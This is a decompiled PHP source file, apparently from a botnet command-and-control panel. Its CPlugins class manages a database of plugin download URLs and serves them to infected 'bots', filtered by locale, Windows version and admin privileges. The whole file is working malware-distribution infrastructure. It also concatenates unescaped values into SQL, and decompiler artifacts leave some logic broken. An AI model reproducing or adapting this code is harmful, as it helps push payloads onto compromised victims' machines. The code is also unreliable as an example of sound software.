<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

define("PLUGIN_LOAD_OPTION_RUNAS_ADMIN", 1);
define("PLUGIN_STATUS_DISABLED", 0);
define("PLUGIN_STATUS_ENABLED", 1);
define("MAX_PLUGIN_COUNT", 16);
class CPlugins extends CSqlWrap
{
    public function AddPlugin($p_name, $p_url, $p_desc, $p_misc_options, $p_load_status, $p_target_locale, $p_target_os, $p_target_general_options)
    {
        $p_name = bin2hex($p_name);
        $p_url = bin2hex($p_url);
        $p_desc = bin2hex($p_desc);
        $query = "INSERT INTO " . $this->pdbname . ".plugins VALUES(NULL, UNHEX('" . $p_name . "'), UNHEX('" . $p_url . "'), UNHEX('" . $p_desc . "'), '" . $p_misc_options . "', '" . $p_load_status . "', UNHEX('" . $p_target_locale . "'), '" . $p_target_os . "', '" . $p_target_general_options . "', UNIX_TIMESTAMP(NOW()))";
        return parent::Query($query);
    }
    public function EditPlugin($p_id, $p_name, $p_url, $p_desc, $p_misc_options, $p_load_status, $p_target_locale, $p_target_os, $p_target_general_options)
    {
        $p_id = (int) $p_id;
        if ($p_id < 0) {
            return NULL;
        }
        $p_name = bin2hex($p_name);
        $p_url = bin2hex($p_url);
        $p_desc = bin2hex($p_desc);
        $p_target_locale = bin2hex($p_target_locale);
        $query = "UPDATE " . $this->pdbname . ".plugins SET plugin_name=UNHEX('" . $p_name . "'), plugin_url=UNHEX('" . $p_url . "'), plugin_desc=UNHEX('" . $p_desc . "'), misc_options='" . $p_misc_options . "', load_status='" . $p_load_status . "', target_locale=UNHEX('" . $p_target_locale . "'), target_os='" . $p_target_os . "', target_general_options='" . $p_target_general_options . "' WHERE id='" . $p_id . "'";
        return parent::Query($query);
    }
    public function DoesPluginExist($p_name)
    {
        $p_name = bin2hex($p_name);
        $_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_ = parent::Query("SELECT id FROM " . $this->pdbname . ".plugins WHERE plugin_name = UNHEX('" . $p_name . "') LIMIT 1");
        if ($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_) {
            if (mysql_num_rows($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_)) {
                return true;
            }
            mysql_free_result($_obfuscated_0D3B043F0A5C255C250C3D39261018052C0E0A111B3511_);
        }
        return false;
    }
    public function GetActivePluginCount()
    {
    }
    public function GetTotalPluginCount()
    {
        $_obfuscated_0D2D04081D051A04213B3E25121A3F171C06192C230722_ = parent::Query("SELECT COUNT(id) FROM " . $this->pdbname . ".plugins");
        $_obfuscated_0D17350B02082531161A14285C2C1B320C28390B271F32_ = 0;
        if ($_obfuscated_0D2D04081D051A04213B3E25121A3F171C06192C230722_) {
            list($_obfuscated_0D17350B02082531161A14285C2C1B320C28390B271F32_) = mysql_fetch_row($_obfuscated_0D2D04081D051A04213B3E25121A3F171C06192C230722_);
            mysql_free_result($_obfuscated_0D2D04081D051A04213B3E25121A3F171C06192C230722_);
        }
        return $_obfuscated_0D17350B02082531161A14285C2C1B320C28390B271F32_;
    }
    public function GetPlugins()
    {
        return parent::Query("SELECT * FROM " . $this->pdbname . ".plugins");
    }
    public function GetPluginsForBot($botClientObjectEx)
    {
        if ($botClientObjectEx == NULL) {
            return NULL;
        }
        $_obfuscated_0D32390F04050D04020B090121173726252F0A5C142E11_ = "";
        $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = NULL;
        $_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ = false;
        $_obfuscated_0D160A103F3C1B1136361C263E1615324031353C230D11_ = parent::Query("SELECT * FROM " . $this->pdbname . ".plugins WHERE load_status = " . PLUGIN_STATUS_ENABLED);
        if ($_obfuscated_0D160A103F3C1B1136361C263E1615324031353C230D11_) {
            while ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = mysql_fetch_assoc($_obfuscated_0D160A103F3C1B1136361C263E1615324031353C230D11_)) {
                if (!isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["plugin_name"]) || !isset($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["plugin_url"])) {
                    break;
                }
                if (1 < strlen($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_locale"]) && stripos($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_locale"], $botClientObjectEx->Bot_Locale) == false) {
                    continue;
                }
                $_obfuscated_0D1322321415260D12065C083C3B180430092F120A1601_ = $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_os"];
                $_obfuscated_0D1322321415260D12065C083C3B180430092F120A1601_ &= ~WINDOWS_VERSION_BIT_64;
                $_obfuscated_0D1322321415260D12065C083C3B180430092F120A1601_ &= ~WINDOWS_VERSION_BIT_32;
                for ($i = 0; $i < 32; $i++) {
                    if ($_obfuscated_0D1322321415260D12065C083C3B180430092F120A1601_ & 1 << $i && $botClientObjectEx->Bot_OS & 1 << $i) {
                        $_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ = true;
                        break;
                    }
                }
                if ($_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ == true) {
                    $_obfuscated_0D2E5C3E1A313235372130345B0E301D0C0715263E1A11_ = false;
                    if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_os"] & WINDOWS_VERSION_BIT_32 && $botClientObjectEx->Bot_OS & WINDOWS_VERSION_BIT_32) {
                        $_obfuscated_0D2E5C3E1A313235372130345B0E301D0C0715263E1A11_ = true;
                    }
                    if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_os"] & WINDOWS_VERSION_BIT_64 && $botClientObjectEx->Bot_OS & WINDOWS_VERSION_BIT_64) {
                        $_obfuscated_0D2E5C3E1A313235372130345B0E301D0C0715263E1A11_ = true;
                    }
                    if ($_obfuscated_0D2E5C3E1A313235372130345B0E301D0C0715263E1A11_ == false) {
                        $_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ = false;
                    }
                }
                if ($_obfuscated_0D3817301F28133C2A5B1A3E3D290E361B04355B3F5C32_ == false) {
                    continue;
                }
                $_obfuscated_0D045B0F210330323912010304100E072A1615150F1511_ = $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["target_general_options"];
                if ($_obfuscated_0D045B0F210330323912010304100E072A1615150F1511_ & PLUGIN_LOAD_OPTION_RUNAS_ADMIN && !($_obfuscated_0D132F27011F1E192930052D1937193E011B2B28323D11_->Bot_Attributes & BOT_ATTRIBUTE_IS_ELEVATED)) {
                    continue;
                }
                $_obfuscated_0D32390F04050D04020B090121173726252F0A5C142E11_ .= "name=" . $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["plugin_name"] . "\n";
                $_obfuscated_0D32390F04050D04020B090121173726252F0A5C142E11_ .= "url=" . $_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["plugin_url"] . "\n";
            }
            @mysql_free_result($_obfuscated_0D160A103F3C1B1136361C263E1615324031353C230D11_);
            return $_obfuscated_0D32390F04050D04020B090121173726252F0A5C142E11_;
        }
        return "";
    }
    public function EnableAllPlugins()
    {
        return parent::Query("UPDATE " . $this->pdbname . ".plugins SET load_status = " . PLUGIN_STATUS_ENABLED);
    }
    public function DisableAllPlugins()
    {
        return parent::Query("UPDATE " . $this->pdbname . ".plugins SET load_status = " . PLUGIN_STATUS_DISABLED);
    }
    public function DisablePlugin($p_id)
    {
        $p_id = (int) $p_id;
        return parent::Query("UPDATE " . $this->pdbname . ".plugins SET load_status = " . PLUGIN_STATUS_DISABLED . " WHERE id = " . $p_id . " LIMIT 1");
    }
    public function EnablePlugin($p_id)
    {
        $p_id = (int) $p_id;
        return parent::Query("UPDATE " . $this->pdbname . ".plugins SET load_status = " . PLUGIN_STATUS_ENABLED . " WHERE id = " . $p_id . " LIMIT 1");
    }
    public function DeletePlugin($p_id)
    {
        $p_id = (int) $p_id;
        return parent::Query("DELETE FROM " . $this->pdbname . ".plugins WHERE id = " . $p_id . " LIMIT 1");
    }
    public function IsValidPluginName($p_name)
    {
        $_obfuscated_0D0C1C1A1C28291E053C3540102B033C1A1D0B192F0222_ = strlen($p_name);
        $_obfuscated_0D2B1C1E2605262D2D322E123214161D08323B0D1B3122_ = @str_split($p_name);
        $i = 0;
        if ($i < $_obfuscated_0D0C1C1A1C28291E053C3540102B033C1A1D0B192F0222_) {
            $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ = (int) @ord($_obfuscated_0D2B1C1E2605262D2D322E123214161D08323B0D1B3122_[$i]);
            if (48 <= $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ && $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ <= 57 || 65 <= $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ && $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ <= 90 || 97 <= $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ && $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ <= 122 || $_obfuscated_0D1C291127371F0B2228252F101F1E0804400B14371A11_ == 95) {
                continue;
            }
            return false;
        }
        return true;
    }
    public function GetActivePluginCountFromRecordset($p_records)
    {
        if ($p_records == NULL) {
            return 0;
        }
        $_obfuscated_0D0C191B3D1D341215010C2915260E363D31392A402222_ = 0;
        while ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_ = @mysql_fetch_assoc($p_records)) {
            if ($_obfuscated_0D1F0831051239312F0829152E32043C062E0807391A01_["load_status"] == PLUGIN_STATUS_ENABLED) {
                $_obfuscated_0D0C191B3D1D341215010C2915260E363D31392A402222_++;
            }
        }
        mysql_data_seek($p_records, 0);
        return $_obfuscated_0D0C191B3D1D341215010C2915260E363D31392A402222_;
    }
}

?>